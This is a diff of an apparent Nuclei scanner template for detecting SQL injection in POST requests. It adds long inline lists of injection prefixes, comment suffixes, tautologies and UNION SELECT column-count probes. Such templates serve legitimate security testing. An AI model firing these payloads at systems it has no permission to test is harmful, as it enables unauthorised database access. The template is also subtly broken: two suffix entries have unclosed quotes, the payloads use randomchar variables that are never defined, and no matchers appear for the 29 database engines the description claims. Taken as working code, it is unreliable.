@@ -1,33 +1,244 @@
-id: error-based-post-sql-injection
+id: error-based-sqli-post-request
 
 info:
   name: SQL Injection Detection for POST Request
   author: Userware (U53RW4R3), fopwn (notnci)
   severity: critical
   description: |
-    Detects potential SQL injection vulnerabilities for POST request
+    Detects potential SQL injection via error strings in 29 database engines for HTTP POST request.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
   reference:
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/boundaries.xml
     - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/errors.xml
-    - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/error_based.xml
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/union_query.xml
   tags: sqli,error,dast
 
 http:
   - filters:
       - type: dsl
         dsl:
-          - method == POST
-          - len(body) > 0
+          - "method == 'POST'"
+          - "len(body) > 0"
         condition: and
 
+    variables:
+        randomstr1: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomstr2: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomnum1: {{rand_int(1, 9999)}}
+        randomnum2: {{rand_int(1, 9999)}}
+
     payloads:
-      payload: payloads/sql-injection.txt
+        prefix:
+            - ""
+            - " "
+            - "' "
+            - "\" "
+            - ") "
+            - ")) "
+            - "))) "
+            - "') "
+            - "')) "
+            - "'))) "
+            - "\") "
+            - "\")) "
+            - "\"))) "
+            - "%'"
+            - " WHERE {{randomnum1}}={{randomnum1}} "
+            - "' WHERE {{randomnum1}}={{randomnum1}} "
+            - "\" WHERE {{randomnum1}}={{randomnum1}} "
+            - "\") WHERE {{randomnum1}}={{randomnum1}} "
+            - "'||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "'||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+            - "'+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+            - "+(SELECT {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "')) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "\")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - ")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "') AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "\") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - ") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "` WHERE {{randomnum1}}={{randomnum1}} "
+            - "`) WHERE {{randomnum1}}={{randomnum1}} "
+            - "]-(SELECT 0 WHERE {{randomnum1}}={{randomnum1}} "
+            - "{{randomstr1}}, "
+        suffix:
+            - ""
+            - " "
+            - "#"
+            - "# {{randomstr1}}"
+            - "--"
+            - "-- {{randomstr1}}"
+            -  "-- \""
+            - "-- ;"
+            - "-- -"
+            - ")+"
+            - ")||'"
+            - ")+'"
+            - "OR '{{randomstr1}}'='{{randomstr2}}
+            - "AND ({{randomnum1}}={{randomnum1}}"
+            - "AND (({{randomnum1}}={{randomnum1}}"
+            - "AND ((({{randomnum1}}={{randomnum1}}"
+            - "AND ('{{randomstr1}}'='{{randomstr1}}"
+            - "AND (('{{randomstr1}}'='{{randomstr1}}"
+            - "AND ((('{{randomstr1}}'='{{randomstr1}}"
+            - "AND '{{randomstr1}}'='{{randomstr1}}"
+            - "AND ('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND (('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND ((('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND '{{randomstr1}}%'='{{randomstr1}}"
+            - "AND '{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND (\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND ((\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND (((\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND (\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND ((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND (((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\" LIKE \"{{randomstr1}}
+            - "{{randomstr2}}"
+        payload:
+            - "OR {{randomnum1}}={{randomnum1}}"
+            - "OR {{randomnum1}}={{randomnum1}} LIMIT 1"
+            - "OR {{randomnum1}}={{randomnum2}}"
+            - "OR {{randomnum1}}={{randomnum2}} LIMIT 1"
+            - "OR '{{randomchar1}}'='{{randomchar1}}'"
+            - "OR '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+            - "OR '{{randomchar1}}'='{{randomchar2}}'"
+            - "OR '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+            - "AND {{randomnum1}}={{randomnum1}}"
+            - "AND {{randomnum1}}={{randomnum1}} LIMIT 1"
+            - "AND {{randomnum1}}={{randomnum2}}"
+            - "AND {{randomnum1}}={{randomnum2}} LIMIT 1"
+            - "AND '{{randomchar1}}'='{{randomchar1}}'"
+            - "AND '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+            - "AND '{{randomchar1}}'='{{randomchar2}}'"
+            - "AND '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+            - "ORDER BY {{randomnum1}}"
+            - "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100"
+            - "GROUP BY {{randomnum1}}"
+            - "GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100"
+            - "UNION SELECT 1"
+            - "UNION SELECT 1,2"
+            - "UNION SELECT 1,2,3"
+            - "UNION SELECT 1,2,3,4"
+            - "UNION SELECT 1,2,3,4,5"
+            - "UNION SELECT 1,2,3,4,5,6"
+            - "UNION SELECT 1,2,3,4,5,6,7"
+            - "UNION SELECT 1,2,3,4,5,6,7,8"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
+            - "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
+            - "UNION SELECT NULL"
+            - "UNION SELECT NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT 1"
+            - "UNION ALL SELECT 1,2"
+            - "UNION ALL SELECT 1,2,3"
+            - "UNION ALL SELECT 1,2,3,4"
+            - "UNION ALL SELECT 1,2,3,4,5"
+            - "UNION ALL SELECT 1,2,3,4,5,6"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
+            - "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
+            - "UNION ALL SELECT NULL"
+            - "UNION ALL SELECT NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+            - "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
 
     fuzzing:
       - part: body
         type: postfix
         mode: single
         fuzz:
-          - "{{payload}}"
+          - "{{prefix}}{{payload}}{{suffix}}"
 
     stop-at-first-match: true
     matchers-condition: or
